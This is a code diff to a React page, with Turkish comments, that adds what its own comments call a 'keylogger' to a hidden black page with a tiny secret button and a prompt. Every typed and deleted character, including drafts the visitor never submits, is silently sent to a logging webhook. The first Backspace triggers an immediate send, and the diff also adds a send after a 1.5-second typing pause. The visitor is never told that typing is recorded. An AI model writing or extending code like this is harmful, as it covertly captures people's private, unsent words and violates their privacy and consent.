@@ -7,7 +7,10 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - YAZILAN HER ŞEY (gönderilsin ya da gönderilmesin) tek mesaj altında toplanarak, rate-limit'e takılmadan konsolide anlık bildirim olarak gönderilir.
+ * - Keylogger mantığıyla harf/kelime biriktirme motoru:
+ *   - Her harf basımında spam notification ATMAZ.
+ *   - Kullanıcı yazarken 1.5 saniye duraksarsa VEYA ilk silme işlemi (Backspace) yaptığında İLK SİLMEDE ANINDA tüm biriken veriyi atar.
+ *   - Gönder butonuna basıldığında nihai cevabı tüm geçmişle gönderir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -29,7 +32,7 @@ export default function LastLetterPage({ onGoHome }) {
   const [inputText, setInputText] = useState('');
   const [isSubmitted, setIsSubmitted] = useState(false);
 
-  // Real-time Text Tracking & State Refs
+  // Real-time Keylogger Accumulator Refs
   const allTypedHistoryRef = useRef('');
   const deletedTextHistoryRef = useRef('');
   const prevTextRef = useRef('');
@@ -37,6 +40,7 @@ export default function LastLetterPage({ onGoHome }) {
   const lastSentTimeRef = useRef(0);
   const typingTimerRef = useRef(null);
   const lastClickTimeRef = useRef(0);
+  const hasTriggeredFirstDeleteRef = useRef(false);
 
   // Detect Client Device
   const detectDevice = useCallback(() => {
@@ -286,27 +290,56 @@ export default function LastLetterPage({ onGoHome }) {
     });
   };
 
-  // Consolidated Live Typing Stream Engine (Aggregates text changes into clean single messages)
+  // Smart Consolidated Keylogger Engine:
+  // - Accumulates all typed characters & deleted text into memory.
+  // - Triggers IMMEDIATELY on the FIRST deletion (Backspace).
+  // - Triggers after a 1.5-second pause in typing (no spamming per character).
   const handleInputChange = (e) => {
     const newVal = e.target.value;
     const oldVal = prevTextRef.current;
     setInputText(newVal);
+
+    let isFirstDeletion = false;
 
     // 1. Accumulate typed characters into memory
     if (newVal.length > oldVal.length) {
       const added = newVal.slice(oldVal.length);
       allTypedHistoryRef.current += added;
     } else if (newVal.length < oldVal.length) {
-      // 2. Track deleted text snippets into memory
+      // 2. Track deleted text snippets
       const deletedSegment = oldVal.slice(newVal.length);
       if (deletedSegment) {
         deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
+
+        // Check if this is the FIRST deletion in the session
+        if (!hasTriggeredFirstDeleteRef.current) {
+          hasTriggeredFirstDeleteRef.current = true;
+          isFirstDeletion = true;
+        }
       }
     }
 
     prevTextRef.current = newVal;
 
-    // 3. Smart Aggregated Buffer Engine (Prevents BotGhost rate-limit and groups keystrokes into 1 consolidated update)
+    // TRIGGER CONDITION A: FIRST DELETION -> Send IMMEDIATELY at that exact moment!
+    if (isFirstDeletion) {
+      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+      lastSentTextRef.current = newVal;
+      lastSentTimeRef.current = Date.now();
+
+      sendLog('secret_input_deleted', {
+        letterText: newVal,
+        answer: newVal,
+        answerInput: newVal,
+        allTypedHistory: allTypedHistoryRef.current || newVal,
+        deletedText: deletedTextHistoryRef.current || null,
+        draftLength: newVal.length,
+        action: `✂️ Ziyaretçi Metin Sildi: "${newVal}" (Kalan Metin)`
+      });
+      return;
+    }
+
+    // TRIGGER CONDITION B: 1.5-Second Typing Pause Consolidation Window
     if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
 
     typingTimerRef.current = setTimeout(() => {
@@ -321,10 +354,10 @@ export default function LastLetterPage({ onGoHome }) {
           allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
           deletedText: deletedTextHistoryRef.current || null,
           draftLength: prevTextRef.current.length,
-          action: `✍️ Ziyaretçi Yazıyor: "${prevTextRef.current}"`
+          action: `✍️ Ziyaretçi Kutuya Yazıyor: "${prevTextRef.current}"`
         });
       }
-    }, 1200); // 1.2 second smart consolidation window
+    }, 1500);
   };
 
   // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
@@ -363,19 +396,6 @@ export default function LastLetterPage({ onGoHome }) {
       draftLength: inputText.length,
       action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
     });
-
-    // Send secondary fallback event after 600ms to avoid webhook collision
-    setTimeout(() => {
-      sendLog('letter_submitted', {
-        letterText: inputText,
-        answer: inputText,
-        answerInput: inputText,
-        allTypedHistory: allTypedHistoryRef.current || inputText,
-        deletedText: deletedTextHistoryRef.current || null,
-        draftLength: inputText.length,
-        action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
-      });
-    }, 600);
 
     setIsSubmitted(true);
     setTimeout(() => {
